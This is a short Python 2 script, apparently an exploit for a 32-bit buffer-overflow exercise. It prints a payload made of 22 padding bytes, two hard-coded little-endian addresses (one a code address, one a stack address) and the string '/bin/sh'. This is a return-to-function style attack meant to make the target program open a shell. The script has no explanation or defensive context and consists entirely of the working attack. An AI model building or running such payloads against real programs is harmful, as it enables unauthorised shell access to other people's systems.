from struct import pack
from shellcode import shellcode

print '0'*22 + pack("<I", 0x08048eed) + pack("<I", 0xbffe95a4)  + "/bin/sh"
